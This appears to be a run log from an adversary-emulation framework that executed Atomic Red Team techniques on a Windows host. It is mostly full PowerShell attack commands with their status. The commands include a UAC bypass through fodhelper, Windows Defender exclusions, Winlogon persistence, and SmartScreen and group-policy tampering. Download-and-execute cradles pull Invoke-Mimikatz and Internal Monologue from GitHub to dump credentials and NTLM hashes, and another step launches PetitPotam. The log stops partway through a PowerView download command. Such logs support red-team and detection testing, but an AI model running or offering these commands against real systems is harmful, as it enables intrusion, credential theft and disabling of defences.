 'command': 'Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE '
            '(PNPClass = \'Image\' OR PNPClass = \'Camera\')"',
 'delegated': '2023-12-04T03:00:51Z',
 'description': 'Enumerate PlugNPlay Camera using powershell commandlet. this '
                'technique was seen in dcrat malware backdoor capabilities '
                'where it enumerate the camera info mounted on the compromised '
                'host. reference: '
                'https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n',
 'executor': 'psh',
 'link_id': '1ccd48af-72af-4c8a-a596-456a99ecdb4a',
 'name': 'Enumerate PlugNPlay Camera',
 'pid': 5172,
 'plaintext_command': 'Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity '
                      'WHERE (PNPClass = \'Image\' OR PNPClass = \'Camera\')"',
 'platform': 'windows',
 'run': '2023-12-04T03:01:01Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1055__multiple__process_injection__4abdd4cce7c4aa8a3804a6f5ff365514__trial_1

atomic_ordering: ['4abdd4cce7c4aa8a3804a6f5ff365514']
------------------------------
{'ability_id': '4abdd4cce7c4aa8a3804a6f5ff365514',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055',
            'technique_name': 'Process Injection'},
 'command': '$notepad = Start-Process notepad -passthru; Start-Process '
            '"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"',
 'delegated': '2023-11-28T02:27:35Z',
 'description': 'This test creates a section object in the local process '
                'followed by a local section view.\n'
                'The shellcode is copied into the local section view and a '
                'remote section view is created in the target process, '
                'pointing to the local section view. \n'
                'A thread is then created in the target process, using the '
                'remote section view as start address.\n',
 'executor': 'psh',
 'link_id': 'c888e0f3-230a-4ca7-ad24-e77f89568487',
 'name': 'Section View Injection',
 'pid': 8644,
 'plaintext_command': '$notepad = Start-Process notepad -passthru; '
                      'Start-Process '
                      '"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"',
 'platform': 'windows',
 'run': '2023-11-28T02:27:40Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1484_001__multiple__domain_policy_modification-_group_policy_modification__5e0427f03faf554046c6a29864087b49__trial_1

atomic_ordering: ['5e0427f03faf554046c6a29864087b49']
------------------------------
{'ability_id': '5e0427f03faf554046c6a29864087b49',
 'agent_reported_time': '2023-11-11T13:09:39Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1484.001',
            'technique_name': 'Domain Policy Modification: Group Policy '
                              'Modification'},
 'command': 'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name '
            'GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; '
            'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name '
            'GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 '
            '-Force; New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name '
            'GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; '
            'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name '
            'GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; '
            'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name '
            'EnableSmartScreen -PropertyType DWord -Value 0 -Force; '
            'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name '
            'ShellSmartScreenLevel -Force',
 'delegated': '2023-12-01T08:46:56Z',
 'description': 'An adversary modifies group policy settings\n',
 'executor': 'psh',
 'link_id': 'c8b148cf-6431-4efa-aa39-f2e98d85b438',
 'name': 'LockBit Black - Modify Group policy settings -Powershell',
 'pid': 5244,
 'plaintext_command': 'New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" '
                      '-Name GroupPolicyRefreshTimeDC -PropertyType DWord '
                      '-Value 0 -Force; New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" '
                      '-Name GroupPolicyRefreshTimeOffsetDC -PropertyType '
                      'DWord -Value 0 -Force; New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" '
                      '-Name GroupPolicyRefreshTime -PropertyType DWord -Value '
                      '0 -Force; New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" '
                      '-Name GroupPolicyRefreshTimeOffset -PropertyType DWord '
                      '-Value 0 -Force; New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" '
                      '-Name EnableSmartScreen -PropertyType DWord -Value 0 '
                      '-Force; New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" '
                      '-Name ShellSmartScreenLevel -Force',
 'platform': 'windows',
 'run': '2023-12-01T08:47:02Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__20d68348c822d2947e5a795ac15a22b0__trial_1

atomic_ordering: ['20d68348c822d2947e5a795ac15a22b0']
------------------------------
{'ability_id': '20d68348c822d2947e5a795ac15a22b0',
 'agent_reported_time': '2023-11-11T13:09:47Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': 'New-Item '
            '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
            '-Force; New-ItemProperty '
            '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
            '-Name "DelegateExecute" -Value "" -Force; Set-ItemProperty '
            '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
            '-Name "(default)" -Value "C:\\Windows\\System32\\cmd.exe" -Force; '
            'Start-Process "C:\\Windows\\System32\\fodhelper.exe"',
 'delegated': '2023-12-02T10:15:00Z',
 'description': 'PowerShell code to bypass User Account Control using the '
                'Windows 10 Features on Demand Helper (fodhelper.exe). '
                'Requires Windows 10.\n'
                'Upon execution command prompt will be opened.\n',
 'executor': 'psh',
 'link_id': '8f8fc5cf-9d6b-40f7-920a-2c48ecd9d0cc',
 'name': 'Bypass UAC using Fodhelper - PowerShell',
 'pid': 8144,
 'plaintext_command': 'New-Item '
                      '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                      '-Force; New-ItemProperty '
                      '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                      '-Name "DelegateExecute" -Value "" -Force; '
                      'Set-ItemProperty '
                      '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                      '-Name "(default)" -Value '
                      '"C:\\Windows\\System32\\cmd.exe" -Force; Start-Process '
                      '"C:\\Windows\\System32\\fodhelper.exe"',
 'platform': 'windows',
 'run': '2023-12-02T10:15:13Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c087fa2d3870144b9fd442f476e7768a__trial_1

atomic_ordering: ['c087fa2d3870144b9fd442f476e7768a']
------------------------------
{'ability_id': 'c087fa2d3870144b9fd442f476e7768a',
 'agent_reported_time': '2023-11-11T13:10:13Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:TEMP\\"; $InstallerAssemblyFileName = "T1218.004.dll"; '
            '$InstallerAssemblyFullPath = Join-Path -Path '
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            "$ExpectedOutput = 'Constructor_'; $TestArgs = @{;     "
            'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
            'OutputAssemblyFileName = $InstallerAssemblyFileName;     '
            "InvocationMethod = 'CheckIfInstallable'; }; $ActualOutput = "
            'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
            '-MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) '
            '{;     throw @"; CheckIfInstallable method execution test '
            'failure. Installer assembly execution output did not match the '
            'expected output.; Expected: $ExpectedOutput; Actual: '
            '$ActualOutput; "@; }',
 'delegated': '2023-11-30T21:49:16Z',
 'description': 'Executes the CheckIfInstallable class constructor runner '
                'instead of executing InstallUtil. Upon execution, the '
                'InstallUtil test harness will be executed.\n'
                'If no output is displayed the test executed successfuly.\n',
 'executor': 'psh',
 'link_id': '61200fd9-b874-4cb5-b5d8-ffdea7618e18',
 'name': 'CheckIfInstallable method call',
 'pid': 10176,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:TEMP\\"; '
                      '$InstallerAssemblyFileName = "T1218.004.dll"; '
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $ExpectedOutput = '
                      "'Constructor_'; $TestArgs = @{;     "
                      'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
                      'OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'CheckIfInstallable'; }; $ActualOutput = "
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
                      '-MinimumViableAssembly; if ($ActualOutput -ne '
                      '$ExpectedOutput) {;     throw @"; CheckIfInstallable '
                      'method execution test failure. Installer assembly '
                      'execution output did not match the expected output.; '
                      'Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T21:49:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1531__impact__account_access_removal__e1ba582a3787829bb7f146009a040c8b__trial_1

atomic_ordering: ['e1ba582a3787829bb7f146009a040c8b']
==============================
==============================
adversary_id: atomic__t1070__defense-evasion__indicator_removal_on_host__cea891e7c3c3efe3723eca495d261472__trial_1

atomic_ordering: ['cea891e7c3c3efe3723eca495d261472']
------------------------------
{'ability_id': 'cea891e7c3c3efe3723eca495d261472',
 'agent_reported_time': '2023-11-11T13:09:54Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070',
            'technique_name': 'Indicator Removal on Host'},
 'command': 'if (-not (Test-Path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt")) { '
            'New-Item "PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt" '
            '-Force } ; echo "1234567890" > '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"; fsutil  '
            'file setZeroData offset=0 length=10 '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"',
 'delegated': '2023-11-28T20:51:47Z',
 'description': 'Finds a file by user name (if Disk Quotas are enabled), '
                "queries allocated ranges for a file, sets a file's short "
                "name, sets a file's valid data length, sets zero data for a "
                'file, or creates a new file. Upon execution, no output\n'
                'will be displayed. More information about fsutil can be found '
                'at '
                'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n'
                '- https://tria.ge/230601-x8x6bsgb24/behavioral2\n',
 'executor': 'psh',
 'link_id': '7c88aa53-a790-4574-933d-6be285af024d',
 'name': 'Indicator Manipulation using FSUtil',
 'pid': 2624,
 'plaintext_command': 'if (-not (Test-Path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt")) '
                      '{ New-Item '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt" '
                      '-Force } ; echo "1234567890" > '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"; '
                      'fsutil  file setZeroData offset=0 length=10 '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"',
 'platform': 'windows',
 'run': '2023-11-28T20:52:02Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1112__defense-evasion__modify_registry__86993ae14d75a6da421c0d98c3facd61__trial_1

atomic_ordering: ['86993ae14d75a6da421c0d98c3facd61']
------------------------------
{'ability_id': '86993ae14d75a6da421c0d98c3facd61',
 'agent_reported_time': '2023-11-11T13:10:26Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1112',
            'technique_name': 'Modify Registry'},
 'command': 'New-ItemProperty -Path '
            '"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System" -Name '
            'DisableCMD -Value 1',
 'delegated': '2023-11-30T00:33:21Z',
 'description': 'Modify the registry of the currently logged in user using '
                'reg.exe via cmd console to disable the windows CMD '
                'application.\n'
                'See example how Agent Tesla malware abuses this technique: '
                'https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n',
 'executor': 'psh',
 'link_id': '568356f9-25c2-4bb1-bd3f-5bec51a651f7',
 'name': 'Disable Windows CMD application',
 'pid': 1028,
 'plaintext_command': 'New-ItemProperty -Path '
                      '"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System" '
                      '-Name DisableCMD -Value 1',
 'platform': 'windows',
 'run': '2023-11-30T00:34:09Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__d3e69d970c19fb2a9a2ee8be47ea17ad__trial_1

atomic_ordering: ['d3e69d970c19fb2a9a2ee8be47ea17ad']
------------------------------
{'ability_id': 'd3e69d970c19fb2a9a2ee8be47ea17ad',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.007',
            'technique_name': 'Signed Binary Proxy Execution: Msiexec'},
 'command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'delegated': '2023-12-01T01:40:10Z',
 'description': 'Executes an MSI containing embedded VBScript code using the '
                'WMI Win32_Product class\n',
 'executor': 'psh',
 'link_id': '0558203b-6959-4287-9bb1-fe6f1d91640f',
 'name': 'WMI Win32_Product Class - Execute Local MSI file with embedded '
         'VBScript',
 'pid': 6480,
 'plaintext_command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'platform': 'windows',
 'run': '2023-12-01T01:40:36Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__d2e0c0165046372fcd5e2bf910eeb477__trial_1

atomic_ordering: ['d2e0c0165046372fcd5e2bf910eeb477']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__9332aff267b00ede37b09606340ee1dc__trial_1

atomic_ordering: ['9332aff267b00ede37b09606340ee1dc']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1187__credential-access__forced_authentication__608b7021a5b8369e9fd858feba6f5611__trial_1

atomic_ordering: ['608b7021a5b8369e9fd858feba6f5611']
------------------------------
{'ability_id': '608b7021a5b8369e9fd858feba6f5611',
 'agent_reported_time': '2023-11-11T13:10:15Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1187',
            'technique_name': 'Forced Authentication'},
 'command': '& "PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe" '
            '10.0.0.3 10.0.0.2 1; Write-Host "End of PetitPotam attack"',
 'delegated': '2023-11-30T12:24:59Z',
 'description': 'This module runs the Windows executable of PetitPotam in '
                'order to coerce authentication for a remote system.\n',
 'executor': 'psh',
 'link_id': '4d34d837-f2a6-44bb-9193-8dbb4dc4d404',
 'name': 'PetitPotam',
 'pid': 8872,
 'plaintext_command': '& '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe" '
                      '10.0.0.3 10.0.0.2 1; Write-Host "End of PetitPotam '
                      'attack"',
 'platform': 'windows',
 'run': '2023-11-30T12:25:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1187__credential-access__forced_authentication__6b8a391237b7169d02dd6538f8290345__trial_1

atomic_ordering: ['6b8a391237b7169d02dd6538f8290345']
------------------------------
{'ability_id': '6b8a391237b7169d02dd6538f8290345',
 'agent_reported_time': '2023-11-11T13:09:49Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1187',
            'technique_name': 'Forced Authentication'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); "
            'Invoke-Internalmonologue -command "-Downgrade true -impersonate '
            'true -restore true"',
 'delegated': '2023-11-30T12:44:24Z',
 'description': 'PowerSharpPack - Retrieving NTLM Hashes without Touching '
                'LSASS technique via function of WinPwn',
 'executor': 'psh',
 'link_id': 'b94417ac-b7f4-4a35-a1ea-eb245a89d350',
 'name': 'WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching '
         'LSASS',
 'pid': 6640,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); "
                      'Invoke-Internalmonologue -command "-Downgrade true '
                      '-impersonate true -restore true"',
 'platform': 'windows',
 'run': '2023-11-30T12:44:31Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__e0946bc3b8b888d6c4cdf3f023fe3c0b__trial_1

atomic_ordering: ['e0946bc3b8b888d6c4cdf3f023fe3c0b']
------------------------------
{'ability_id': 'e0946bc3b8b888d6c4cdf3f023fe3c0b',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': '$excludedExts= ".exe"; Add-MpPreference -ExclusionExtension  '
            '$excludedExts',
 'delegated': '2023-12-03T14:05:32Z',
 'description': 'Malware can exclude specific extensions from being scanned '
                'and evading detection. \n'
                'Upon successful execution, the extension(s) should be on the '
                'list of excluded extensions.\n'
                'To check the exclusion list using poweshell  '
                '(Get-MpPreference).ExclusionExtension.\n',
 'executor': 'psh',
 'link_id': '2d5d0fbe-5f39-48b5-9907-8435bea1f045',
 'name': 'Tamper with Windows Defender Evade Scanning -Extension',
 'pid': 6340,
 'plaintext_command': '$excludedExts= ".exe"; Add-MpPreference '
                      '-ExclusionExtension  $excludedExts',
 'platform': 'windows',
 'run': '2023-12-03T14:05:54Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__92578413245a3418c9dc21dc5db784ff__trial_1

atomic_ordering: ['92578413245a3418c9dc21dc5db784ff']
------------------------------
{'ability_id': '92578413245a3418c9dc21dc5db784ff',
 'agent_reported_time': '2023-11-11T13:10:39Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.004',
            'technique_name': 'Boot or Logon Autostart Execution: Winlogon '
                              'Helper DLL'},
 'command': 'Set-ItemProperty "HKLM:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\" "Userinit" "Userinit.exe, '
            'C:\\Windows\\System32\\cmd.exe" -Force',
 'delegated': '2023-12-02T05:41:56Z',
 'description': 'PowerShell code to set Winlogon userinit key to execute a '
                'binary at logon along with userinit.exe.\n'
                '\n'
                'Upon successful execution, PowerShell will modify a registry '
                'value to execute cmd.exe upon logon/logoff.\n',
 'executor': 'psh',
 'link_id': 'cf8e394f-e220-415e-81d2-00e0d2ad32f5',
 'name': 'Winlogon HKLM Userinit Key Persistence - PowerShell',
 'pid': 5528,
 'plaintext_command': 'Set-ItemProperty "HKLM:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\" "Userinit" '
                      '"Userinit.exe, C:\\Windows\\System32\\cmd.exe" -Force',
 'platform': 'windows',
 'run': '2023-12-02T05:42:49Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__c407315583b3a00d9a2e0c3c510f2c96__trial_1

atomic_ordering: ['c407315583b3a00d9a2e0c3c510f2c96']
------------------------------
{'ability_id': 'c407315583b3a00d9a2e0c3c510f2c96',
 'agent_reported_time': '2023-11-11T13:10:27Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': '$excludedProcess = "outlook.exe"; Add-MpPreference '
            '-ExclusionProcess $excludedProcess',
 'delegated': '2023-12-03T12:47:13Z',
 'description': 'Malware can exclude specific processes from being scanned and '
                'evading detection.\n'
                'Upon successful execution, the process(es) should be on the '
                'list of excluded processes. \n'
                'To check the exclusion list using poweshell  '
                '(Get-MpPreference).ExclusionProcess."\n',
 'executor': 'psh',
 'link_id': '7097bdda-deaa-4f51-ba2e-b8095c1592eb',
 'name': 'Tamper with Windows Defender Evade Scanning -Process',
 'pid': 8432,
 'plaintext_command': '$excludedProcess = "outlook.exe"; Add-MpPreference '
                      '-ExclusionProcess $excludedProcess',
 'platform': 'windows',
 'run': '2023-12-03T12:48:01Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1528__credential-access__steal_application_access_token__22dda265607e5cecaa9ee0f0f65b7dfd__trial_1

atomic_ordering: ['22dda265607e5cecaa9ee0f0f65b7dfd']
==============================
==============================
adversary_id: atomic__t1027__defense-evasion__obfuscated_files_or_information__b62952c5352ee68c1340feb08a5a02a1__trial_1

atomic_ordering: ['b62952c5352ee68c1340feb08a5a02a1']
------------------------------
{'ability_id': 'b62952c5352ee68c1340feb08a5a02a1',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027',
            'technique_name': 'Obfuscated Files or Information'},
 'command': '$OriginalCommand = \'Write-Host "Hey, Atomic!"\'; $Bytes = '
            '[System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); '
            '$EncodedCommand =[Convert]::ToBase64String($Bytes); '
            '$EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand',
 'delegated': '2023-11-27T12:55:08Z',
 'description': 'Creates base64-encoded PowerShell code and executes it. This '
                'is used by numerous adversaries and malicious tools.\n'
                '\n'
                'Upon successful execution, powershell will execute an encoded '
                'command and stdout default is "Write-Host "Hey, Atomic!"\n',
 'executor': 'psh',
 'link_id': '730c8421-fcef-49a4-b6de-1ac8939b3482',
 'name': 'Execute base64-encoded PowerShell',
 'pid': 9660,
 'plaintext_command': '$OriginalCommand = \'Write-Host "Hey, Atomic!"\'; '
                      '$Bytes = '
                      '[System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); '
                      '$EncodedCommand =[Convert]::ToBase64String($Bytes); '
                      '$EncodedCommand; powershell.exe -EncodedCommand '
                      '$EncodedCommand',
 'platform': 'windows',
 'run': '2023-11-27T12:55:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__90c76bd616efee6d7c98dc6c1dcc6e99__trial_1

atomic_ordering: ['90c76bd616efee6d7c98dc6c1dcc6e99']
------------------------------
{'ability_id': '90c76bd616efee6d7c98dc6c1dcc6e99',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
            '-ComObject '
            "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
            "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
            '$reg (Item Variable:_).Value[0] (Variable '
            '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
            'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
            '_).Value.MainWindowTitle})){Start-Sleep -Milliseconds '
            '500};While(!$wshell.AppActivate($title)){Start-Sleep '
            "-Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep "
            "-Milliseconds 500;@($url,(' "
            "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
            '_).Value)};$res=$Null;While($res.Length -lt '
            "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
            'Variable:_).Value)};Start-Sleep -Milliseconds '
            "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
            '_).Value)};If(GPS|?{(Item '
            "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
            "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
            '$reg (Item Variable:_).Value $props.((Variable '
            '_).Value)};IEX($res);invoke-mimikatz -dumpcr',
 'delegated': '2023-11-28T06:40:48Z',
 'description': 'Run mimikatz via PsSendKeys. Upon execution, automated '
                'actions will take place to open file explorer, open notepad '
                'and input code, then mimikatz dump info will be displayed.\n',
 'executor': 'psh',
 'link_id': '1b873e76-16b5-4917-9b8d-dd447cb945b0',
 'name': 'Mimikatz - Cradlecraft PsSendKeys',
 'pid': 6340,
 'plaintext_command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
                      '-ComObject '
                      "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
                      "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
                      '$reg (Item Variable:_).Value[0] (Variable '
                      '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
                      'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
                      '_).Value.MainWindowTitle})){Start-Sleep -Milliseconds '
                      '500};While(!$wshell.AppActivate($title)){Start-Sleep '
                      "-Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep "
                      "-Milliseconds 500;@($url,(' "
                      "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
                      '_).Value)};$res=$Null;While($res.Length -lt '
                      "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
                      'Variable:_).Value)};Start-Sleep -Milliseconds '
                      "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
                      '_).Value)};If(GPS|?{(Item '
                      "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
                      "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
                      '$reg (Item Variable:_).Value $props.((Variable '
                      '_).Value)};IEX($res);invoke-mimikatz -dumpcr',
 'platform': 'windows',
 'run': '2023-11-28T06:41:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1135__discovery__network_share_discovery__7a87eec9166dd9d24825a4af7bb3bc47__trial_1

atomic_ordering: ['7a87eec9166dd9d24825a4af7bb3bc47']
------------------------------
{'ability_id': '7a87eec9166dd9d24825a4af7bb3bc47',
 'agent_reported_time': '2023-11-11T13:10:07Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1135',
            'technique_name': 'Network Share Discovery'},
 'command': 'if (Test-Path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1") { ; } '
            'else {New-Item -Type Directory '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\" -ErrorAction Ignore '
            '-Force | Out-Null; Invoke-WebRequest '
